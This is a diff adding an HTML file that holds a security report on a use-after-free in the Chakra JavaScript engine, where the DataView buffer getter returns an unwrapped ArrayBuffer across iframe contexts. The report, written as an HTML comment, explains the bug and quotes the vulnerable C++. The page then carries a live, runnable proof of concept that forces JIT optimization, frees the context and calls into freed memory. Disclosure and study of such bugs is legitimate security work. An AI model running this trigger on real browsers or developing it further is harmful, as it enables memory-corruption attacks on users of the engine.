@@ -1,0 +1,127 @@
+<!--
+1. Background
+The CrossSite class is used for passing JavaScript variables across different contexts. Chakra is basically trying to wrap every variable being passed from a context to another context. The way it wraps an object is, first overwrite the virtual function table pointer of the given object, checks and wraps all inputs and outputs in the overridden methods. The reason for doing it is because direct access to a closed context may cause unexpected behaviors such as Use-After-Free.
+
+Use-After-Free
+The addresses of some objects such as string constants are directly inlined into JITed code. When closing a context, the context loses the references to those objects. And since the garbage collector doesn't scan those JITed code area for garbage collection, the following code could have caused Use-After-Free.
+
+Code:
+let f = document.body.appendChild(document.createElement('iframe'));
+let opt = f.contentWindow.eval(`
+    function opt() {
+        return 'xxxx';
+    }
+
+    // Optimizing "opt", so that the address of 'xxxx' can be inlineed.
+    for (let i = 0; i < 100000; i++) {
+        opt();
+    }
+
+    opt;
+`);
+
+f.onload = () => {
+    f.onload = null;
+
+    // Garbage collection
+    for (let i = 0; i < 10; i++)
+        new ArrayBuffer(1024 * 1024 * 40);
+
+    let obj = opt();  // "opt" returns the freed string constant.
+};
+
+// Closing the diffrent context
+f.src = 'about:blank';
+
+But in fact, if you run the code, you will see an exception saying "Can't execute code from a freed script". That is what the ClassSite class do. The class caught the call to the "opt" function, threw the exception. In other words, if we can fetch the "opt" function from the different context without having it wrapped, it can lead to Use-After-Free. I figured out that there would be so many ways for it.
+
+2. Bug
+Here's the first bug.
+    Var DataView::EntryGetterBuffer(RecyclableObject* function, CallInfo callInfo, ...)
+    {
+        ...
+        ARGUMENTS(args, callInfo);
+        ScriptContext* scriptContext = function->GetScriptContext();
+        ...
+        DataView* dataView = DataView::FromVar(args[0]);
+        ArrayBufferBase* arrayBuffer = dataView->GetArrayBuffer();
+        ...
+        return arrayBuffer;
+    }
+
+As you can see, it directly returns the ArrayBuffer object without wrapping it. Since the DataView class also doesn't wrap the object in the MarshalToScriptContext method which is called when an object gets wrapped, the ArrayBuffer object will never have a chance to be wrapped.
+
+It seems this is a common vulnerable code pattern in Chakra. I will separately report other vulnerable methods.
+
+PoC:
+let f = document.body.appendChild(document.createElement('iframe'));
+let wrapped_dv = f.contentWindow.eval(`
+    function opt() {
+        return 'xxxx';
+    }
+
+    // Optimizing "opt", so that the address of 'xxxx' can be inlineed.
+    for (let i = 0; i < 100000; i++) {
+        opt();
+    }
+
+    let dv = new DataView(new ArrayBuffer(0));
+    dv.buffer.opt = opt;
+    dv;
+`);
+
+let buffer = DataView.prototype.__lookupGetter__('buffer').call(wrapped_dv);
+let opt = buffer.opt;
+
+f.onload = () => {
+    f.onload = null;
+
+    // Garbage collection
+    for (let i = 0; i < 10; i++)
+        new ArrayBuffer(1024 * 1024 * 40);
+
+    let obj = opt();  // "opt" returns the freed string constant.
+    alert(obj);
+};
+
+// Closing the diffrent context
+f.src = 'about:blank';
+-->
+
+<body>
+<script>
+let f = document.body.appendChild(document.createElement('iframe'));
+let wrapped_dv = f.contentWindow.eval(`
+    function opt() {
+        return 'xxxx';
+    }
+
+    // Optimizing "opt", so that the address of 'xxxx' can be inlineed.
+    for (let i = 0; i < 100000; i++) {
+        opt();
+    }
+
+    let dv = new DataView(new ArrayBuffer(0));
+    dv.buffer.opt = opt;
+    dv;
+`);
+
+let buffer = DataView.prototype.__lookupGetter__('buffer').call(wrapped_dv);
+let opt = buffer.opt;
+
+f.onload = () => {
+    f.onload = null;
+
+    // Garbage collection
+    for (let i = 0; i < 10; i++)
+        new ArrayBuffer(1024 * 1024 * 40);
+
+    let obj = opt();  // "opt" returns the freed string constant.
+    alert(obj);
+};
+
+// Closing the diffrent context
+f.src = 'about:blank';
+
+</script>
+</body>
